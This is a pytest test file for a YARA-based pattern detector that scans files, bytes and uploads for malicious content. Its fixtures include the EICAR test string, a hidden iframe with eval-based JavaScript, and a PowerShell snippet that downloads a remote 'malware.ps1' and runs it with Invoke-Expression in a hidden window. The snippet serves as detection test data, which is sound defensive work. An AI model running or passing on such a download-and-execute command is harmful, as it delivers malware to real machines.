"""
Tests for the pattern detector module.
"""
import os
import io
import pytest
from unittest.mock import patch, MagicMock
from pathlib import Path
from fastapi import UploadFile

from core.pattern_detector import PatternDetector

# EICAR test string - a standard test file for anti-virus software
# This is a harmless file that anti-virus software should detect as malware
EICAR_TEST_STRING = (
    b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
)

# Sample suspicious PowerShell content
SUSPICIOUS_POWERSHELL = b"""
# This is a test script with suspicious patterns
$webClient = New-Object Net.WebClient
$payload = $webClient.DownloadString('http://example.com/malware.ps1')
Invoke-Expression $payload -WindowStyle Hidden
"""

# Sample suspicious JavaScript content
SUSPICIOUS_JS = b"""
// This is a test script with suspicious patterns
var payload = "VERYLONG" + "STRING" * 1000;
eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 72, 101, 108, 108, 111, 39, 41));
var iframe = document.createElement('iframe');
iframe.style.display = "none";
"""

@pytest.fixture
def pattern_detector():
    """Create a PatternDetector instance for testing."""
    return PatternDetector()

@pytest.fixture
def mock_yara():
    """Mock the yara module."""
    with patch('yara.compile') as mock_compile:
        # Create a mock rules object
        mock_rules = MagicMock()
        mock_compile.return_value = mock_rules
        
        # Configure match method to return no matches by default
        mock_rules.match.return_value = []
        
        yield mock_rules

@pytest.fixture
def mock_yara_with_matches():
    """Mock the yara module with matches."""
    with patch('yara.compile') as mock_compile:
        # Create a mock rules object
        mock_rules = MagicMock()
        mock_compile.return_value = mock_rules
        
        # Create a mock match object
        mock_match = MagicMock()
        mock_match.rule = "Suspicious_PowerShell_Commands"
        mock_match.tags = ["suspicious", "powershell"]
        mock_match.meta = {"description": "Test description", "severity": "medium"}
        mock_match.strings = [
            (0, "$invoke_expression", b"Invoke-Expression"),
            (1, "$web_client", b"New-Object Net.WebClient"),
            (2, "$hidden_window", b"-WindowStyle Hidden")
        ]
        
        # Configure match method to return the mock match
        mock_rules.match.return_value = [mock_match]
        
        yield mock_rules

@pytest.fixture
def test_upload_file():
    """Create a test upload file."""
    file_content = SUSPICIOUS_POWERSHELL
    file = io.BytesIO(file_content)
    
    # Create an UploadFile with async methods
    upload_file = UploadFile(
        filename="test.ps1",
        file=file,
    )
    
    # Replace methods with async versions
    async def async_read():
        return file.getvalue()
        
    async def async_seek(position):
        file.seek(position)
        
    upload_file.read = async_read
    upload_file.seek = async_seek
    
    return upload_file

@pytest.fixture
def test_rules_dir(tmp_path):
    """Create a temporary directory with test YARA rules."""
    rules_dir = tmp_path / "yara_rules"
    rules_dir.mkdir()
    
    # Create a test rule file
    rule_file = rules_dir / "test_rules.yar"
    rule_file.write_text("""
    rule Test_Rule {
        meta:
            description = "Test rule"
            author = "Test Author"
            severity = "low"
        
        strings:
            $test_string = "test"
        
        condition:
            $test_string
    }
    """)
    
    return rules_dir

@pytest.mark.asyncio
async def test_detector_initialization():
    """Test detector initialization with default values."""
    detector = PatternDetector()
    assert detector.rules_dir.endswith(os.path.join("data", "security", "yara_rules"))
    
    # Test with custom values
    custom_dir = "/custom/rules/dir"
    detector = PatternDetector(rules_dir=custom_dir)
    assert detector.rules_dir == custom_dir

@pytest.mark.asyncio
async def test_rules_compilation(test_rules_dir):
    """Test YARA rules compilation."""
    detector = PatternDetector(rules_dir=str(test_rules_dir))
    
    # Access the rules property to trigger compilation
    rules = detector.rules
    
    # Verify the rules were compiled
    assert rules is not None

@pytest.mark.asyncio
async def test_scan_file_no_matches(mock_yara, pattern_detector, tmp_path):
    """Test scanning a file with no matches."""
    # Create a test file
    test_file = tmp_path / "clean.txt"
    test_file.write_text("This is a clean file")
    
    # Configure the mock to return no matches
    mock_yara.match.return_value = []
    
    # Scan the file
    results = await pattern_detector.scan_file(test_file)
    
    # Verify the result
    assert isinstance(results, list)
    assert len(results) == 0
    mock_yara.match.assert_called_once_with(str(test_file))

@pytest.mark.asyncio
async def test_scan_file_with_matches(mock_yara_with_matches, pattern_detector, tmp_path):
    """Test scanning a file with matches."""
    # Create a test file
    test_file = tmp_path / "suspicious.ps1"
    test_file.write_bytes(SUSPICIOUS_POWERSHELL)
    
    # Scan the file
    results = await pattern_detector.scan_file(test_file)
    
    # Verify the result
    assert isinstance(results, list)
    assert len(results) == 1
    assert results[0]["rule"] == "Suspicious_PowerShell_Commands"
    assert "suspicious" in results[0]["tags"]
    assert results[0]["meta"]["severity"] == "medium"
    assert len(results[0]["strings"]) == 3
    mock_yara_with_matches.match.assert_called_once_with(str(test_file))

@pytest.mark.asyncio
async def test_scan_bytes_no_matches(mock_yara, pattern_detector):
    """Test scanning bytes with no matches."""
    # Configure the mock to return no matches
    mock_yara.match.return_value = []
    
    # Scan the bytes
    results = await pattern_detector.scan_bytes(b"This is clean content")
    
    # Verify the result
    assert isinstance(results, list)
    assert len(results) == 0
    mock_yara.match.assert_called_once()
    # Verify data parameter was passed
    assert mock_yara.match.call_args[1].get('data') is not None

@pytest.mark.asyncio
async def test_scan_bytes_with_matches(mock_yara_with_matches, pattern_detector):
    """Test scanning bytes with matches."""
    # Scan the bytes
    results = await pattern_detector.scan_bytes(SUSPICIOUS_POWERSHELL)
    
    # Verify the result
    assert isinstance(results, list)
    assert len(results) == 1
    assert results[0]["rule"] == "Suspicious_PowerShell_Commands"
    mock_yara_with_matches.match.assert_called_once()
    # Verify data parameter was passed
    assert mock_yara_with_matches.match.call_args[1].get('data') is not None

@pytest.mark.asyncio
async def test_scan_upload_file(mock_yara_with_matches, pattern_detector, test_upload_file):
    """Test scanning an upload file."""
    # Scan the upload file
    results = await pattern_detector.scan_upload_file(test_upload_file)
    
    # Verify the result
    assert isinstance(results, list)
    assert len(results) == 1
    assert results[0]["rule"] == "Suspicious_PowerShell_Commands"
    mock_yara_with_matches.match.assert_called_once()

@pytest.mark.asyncio
async def test_get_available_rules(test_rules_dir):
    """Test getting available rules."""
    # Create a detector with the test rules directory
    detector = PatternDetector(rules_dir=str(test_rules_dir))
    
    # Mock the yara.compile and match methods to return rule information
    with patch('yara.compile') as mock_compile:
        # Create a mock rules object
        mock_rules = MagicMock()
        mock_compile.return_value = mock_rules
        
        # Create a mock match object
        mock_match = MagicMock()
        mock_match.rule = "Test_Rule"
        mock_match.tags = []
        mock_match.meta = {"description": "Test rule", "author": "Test Author", "severity": "low"}
        
        # Configure match method to return the mock match
        mock_rules.match.return_value = [mock_match]
        
        # Get the available rules
        rule_info = detector.get_available_rules()
        
        # Verify the result
        assert isinstance(rule_info, list)
        assert len(rule_info) == 1
        assert rule_info[0]["rule"] == "Test_Rule"
        assert rule_info[0]["file"] == "test_rules.yar"
        assert rule_info[0]["meta"]["description"] == "Test rule" 